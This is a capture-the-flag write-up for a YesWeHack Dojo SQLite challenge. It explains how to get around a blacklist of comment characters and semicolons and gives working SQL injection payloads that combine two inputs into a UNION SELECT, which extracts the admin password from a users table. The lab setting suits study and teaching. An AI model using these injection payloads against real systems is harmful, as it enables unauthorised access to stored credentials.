# YesWeHack Dojo Challenge #5

"NO COMMENTS, NO PROBLEMS"

## Description

Goal: Get the password of the user named admin with a single Query (not blind)

[Link](https://dojo-yeswehack.com/Playground#eyJkZXNjcmlwdGlvbiI6ImBgYFxuJyMjOjo6ICMjOjonIyMjIyMjIzo6OicjIyMjIyM6OjonIyMjIyMjIzo6JyMjOjo6OicjIzonIyM6Ojo6JyMjOicjIyMjIyMjIzonIyM6OjogIyM6JyMjIyMjIyMjOjonIyMjIyMjOjpcbiAjIyM6OiAjIzonIyMuLi4uICMjOicjIy4uLiAjIzonIyMuLi4uICMjOiAjIyM6OicjIyM6ICMjIzo6JyMjIzogIyMuLi4uLjo6ICMjIzo6ICMjOi4uLiAjIy4uOjonIyMuLi4gIyM6XG4gIyMjIzogIyM6ICMjOjo6OiAjIzogIyM6OjouLjo6ICMjOjo6OiAjIzogIyMjIycjIyMjOiAjIyMjJyMjIyM6ICMjOjo6Ojo6OiAjIyMjOiAjIzo6OjogIyM6Ojo6ICMjOjo6Li46OlxuICMjICMjICMjOiAjIzo6OjogIyM6ICMjOjo6Ojo6OiAjIzo6OjogIyM6ICMjICMjIyAjIzogIyMgIyMjICMjOiAjIyMjIyM6OjogIyMgIyMgIyM6Ojo6ICMjOjo6Oi4gIyMjIyMjOjpcbiAjIy4gIyMjIzogIyM6Ojo6ICMjOiAjIzo6Ojo6OjogIyM6Ojo6ICMjOiAjIy4gIzogIyM6ICMjLiAjOiAjIzogIyMuLi46Ojo6ICMjLiAjIyMjOjo6OiAjIzo6Ojo6Li4uLi4gIyM6XG4gIyM6LiAjIyM6ICMjOjo6OiAjIzogIyM6OjogIyM6ICMjOjo6OiAjIzogIyM6Ljo6ICMjOiAjIzouOjogIyM6ICMjOjo6Ojo6OiAjIzouICMjIzo6OjogIyM6Ojo6JyMjOjo6ICMjOlxuICMjOjouICMjOi4gIyMjIyMjIzo6LiAjIyMjIyM6Oi4gIyMjIyMjIzo6ICMjOjo6OiAjIzogIyM6Ojo6ICMjOiAjIyMjIyMjIzogIyM6Oi4gIyM6Ojo6ICMjOjo6Oi4gIyMjIyMjOjpcbi4uOjo6Oi4uOjo6Li4uLi4uLjo6OjouLi4uLi46Ojo6Li4uLi4uLjo6Oi4uOjo6OjouLjo6Li46Ojo6Oi4uOjouLi4uLi4uLjo6Li46Ojo6Li46Ojo6Oi4uOjo6Ojo6Li4uLi4uOjo6XG5gYGBcblxuVGhlIGFkbWluIHBhc3N3b3JkIGhhZCBsZWFrZWQsIGV2ZXJ5Ym9keSBpcyBwdXp6bGVkIGFzIHRoZXkgdGhvdWdodCB0aGlzIFNRbGl0ZSBEYXRhYmFzZSBpbnB1dHMgd2VyZSBwcm9wZXJseSBzYW5pdGl6ZWQuXG5MYXRlciB3ZSBoYWQgYSBjb250YWN0IHdpdGggdGhlIEhhY2tlciByZXNwb25zaWJsZSBmb3IgdGhlIGJyZWFjaCBzbyB3ZSBhc2tlZCBoaW0gaG93IGhlIGhhZCBiZWVuIGFibGUgdG8gcHVsbCB0aGlzIHBhc3N3b3JkXG5IZSByZXBsaWVkOlxuXG4gICAgXCJOTyBDT01NRU5UUywgTk8gUFJPQkxFTVNcIlxuXG5XaWxsIHlvdSBiZSAxOTcgZW5vdWdoIHRvIGJ1aWxkIGEgd29ya2luZyBpbmplY3Rpb24gdG8gcmVjb3ZlciB0aGUgYWRtaW4gcGFzc3dvcmQgZnJvbSB0aGUgdXNlcnMgdGFibGU/XG5cblxuIyMjIEdvYWw6IFxuXG4tIEdldCB0aGUgcGFzc3dvcmQgb2YgdGhlIHVzZXIgbmFtZWQgYGFkbWluYFxuLSBTaW5nbGUgUXVlcnkgKG5vdCBibGluZClcbiIsInNvbHV0aW9uIjpudWxsLCJoaW50cyI6WyIjIyBIaW50ICMxXG5cbmBgYFxuXG5DUkVBVEUgVEFCTEUgYHVzZXJzYCAoXG4gIGBpZGAgaW50ZWdlciBQUklNQVJZIEtFWSxcbiAgYHVzZXJuYW1lYCB0ZXh0LFxuICBgZW1haWxgIHRleHQsXG4gIGBwYXNzd29yZGAgdGV4dCxcbiAgYHJvbGVgIHRleHRcbik7XG5cbmBgYCJdLCJxdWVyeSI6eyJiYWNrZW5kIjoiU3FsaXRlMyIsInRlbXBsYXRlIjoiLS1leGVjXG5DUkVBVEUgVEFCTEUgbG9nKG5hbWUgVEVYVCwgdmFsIFRFWFQpO1xuQ1JFQVRFIFRBQkxFIGVudihuYW1lIFRFWFQsIHZhbCBURVhUKTtcbklOU0VSVCBJTlRPIGVudiBWQUxVRVMgKCdQQVRIJywgJy9iaW46L3Vzci9iaW4nKTtcbi0tcnVuXG5JTlNFUlQgSU5UTyBsb2cgVkFMVUVTICgnJG5hbWUnLCAnJHZhbCcpO1xuLS1yZXR1cm5cblNFTEVDVCB2YWwgRlJPTSBlbnYgV0hFUkUgKHZhbD0nJHZhbCcpIG9yIChuYW1lPSckbmFtZScpO1xuIiwiZmlsdGVycyI6eyIkbmFtZSI6W3siZnVuYyI6IkJsYWNrbGlzdCIsImFyZ3MiOltbIi8qIiwiLS0iLCI7IiwiIyJdLGZhbHNlXX1dLCIkdmFsIjpbeyJmdW5jIjoiQmxhY2tsaXN0IiwiYXJncyI6W1siLyoiLCItLSIsIjsiLCIjIl0sZmFsc2VdfV19fX0=) to the challenge

This is the challenges code:

``` sql
--exec
CREATE TABLE log(name TEXT, val TEXT);
CREATE TABLE env(name TEXT, val TEXT);
INSERT INTO env VALUES ('PATH', '/bin:/usr/bin');
--run
INSERT INTO log VALUES ('$name', '$val');
--return
SELECT val FROM env WHERE (val='$val') or (name='$name');
```

The challenge here was to get a bypass for the newly implemented anti-SQLi measures. There are two different user inputs: `name` and `value`. They are both used in two different statements: first in an insert statement for some logging and second in a where clause of the select statement.

The following terms are blacklisted and must no be used: `/* -- ; #`

## Bypass
The first, that stands out, is that the order in that the two variables are used are different in the statements. Second, the two statements need a different number of columns. So a simple UNION SELECT, that would be used in both statements would not succeed.
The trick here is to gain advantage from the different orders. So the goal must be, to make the UNION SELECT, that we need for the last SELECT statement to be ignored in the INPUT statement.

And here are the payloads, that give us the admin password:

```
name: ) UNION SELECT password FROM users WHERE id = 1 OR (id = ' OR 1,
val: ||' OR '||' OR
```

This results in the following code:

``` sql
--run
INSERT INTO log VALUES (') UNION SELECT password FROM users WHERE id = 1 OR (id = ' OR 1,', '||' OR '||' OR');
--return
SELECT val FROM env WHERE (val='||' OR '||' OR') or (name=') UNION SELECT password FROM users WHERE id = 1 OR (id = ' OR 1,');
```
